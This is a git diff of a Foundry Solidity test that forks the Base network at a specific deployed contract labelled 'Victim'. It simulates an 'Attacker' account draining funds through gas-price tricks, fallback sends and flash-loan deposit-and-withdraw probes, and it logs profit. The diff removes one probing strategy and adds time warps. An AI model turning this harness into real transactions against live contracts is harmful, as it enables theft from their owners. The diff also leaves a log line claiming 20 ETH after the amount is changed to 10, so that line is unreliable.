@@ -6,11 +6,11 @@ import "forge-std/Test.sol";
 import "forge-std/console.sol";
 
 contract HoneypotTestETH is Test {
-    address victim = 0xB7639F5b2f9Ac7FC47a34f8f3BbcbE94f5C55458;
+    address victim = 0x63242A4Ea82847b20E506b63B0e2e2eFF0CC6cB0;
     address attacker = address(0x1337);
     
     function setUp() public {
-        vm.createSelectFork("https://1rpc.io/base");
+        vm.createSelectFork("https://mainnet.base.org");
         vm.label(victim, "Victim");
         vm.label(attacker, "Attacker");
     }
@@ -21,62 +21,8 @@ contract HoneypotTestETH is Test {
         console.log("Contract ETH Balance:", address(victim).balance);
 
         
-        // Adaptive Simulation for Sequencer Fee (Updated Strategy)
-        // Ensure tx.origin is attacker for refund checks
-        vm.stopPrank();
-        vm.startPrank(attacker, attacker);
-
-        vm.deal(attacker, 20 ether);
-        uint256 sfBalBefore = attacker.balance;
         
-        // 1. Aggressive Gas Price Simulation (BaseFee * 100)
-        vm.txGasPrice(block.basefee * 100); 
-        
-        bool sfSuccess;
-        // Attempt standard execute
-        (sfSuccess, ) = victim.call{value: 0.0001 ether}(abi.encodeWithSignature("execute()"));
-        
-        bool profitFound = false;
-        if (sfSuccess) {
-             if (attacker.balance > sfBalBefore) {
-                 profitFound = true;
-                 console.log("PROFIT_WEI:", attacker.balance - sfBalBefore);
-                 console.log("SUCCESS_METHOD: sequencer_fee_high_gas");
-             }
-        }
-
-        // 2. Fallback probing if no profit found (or failed)
-        // Try sending 1 wei to contract address (no data)
-        if (!profitFound) {
-             // Reset balance for clean check (optional, but let's just check relative gain)
-             uint256 balCheck = attacker.balance;
-             (sfSuccess, ) = victim.call{value: 1 wei}("");
-             if (sfSuccess) {
-                 if (attacker.balance > balCheck) {
-                     profitFound = true;
-                     console.log("PROFIT_WEI:", attacker.balance - balCheck); // Net gain from this step
-                     console.log("SUCCESS_METHOD: sequencer_fee_fallback_wei");
-                 }
-             }
-        }
-        
-        if (profitFound) {
-             vm.stopPrank();
-             return;
-        }
-
-        uint256 sfBalAfterFinal = attacker.balance;
-        if (sfBalAfterFinal > sfBalBefore) {
-            console.log("PROFIT_WEI:", sfBalAfterFinal - sfBalBefore);
-        } else {
-            console.log("[SIM] No profit or loss detected.");
-        }
-        console.log("SUCCESS_METHOD: sequencer_fee_no_profit");
-        vm.stopPrank();
-        return;
-    
-        
-        uint256 amount = 20 ether; // Flash Loan Amount
+        uint256 amount = 10 ether; // Flash Loan Amount
         vm.deal(attacker, amount); 
         console.log("Flash Loan Mode: 20 ETH simulated");
         
@@ -104,6 +50,9 @@ contract HoneypotTestETH is Test {
         
         require(success, "Deposit failed (tried all variants)");
         
+        vm.warp(block.timestamp + 86401);
+        vm.roll(block.number + 100);
+    
         
         // 2. Withdraw
         // Priority: withdraw(uint256) -> withdraw() -> withdrawAll() -> redeem(uint256)
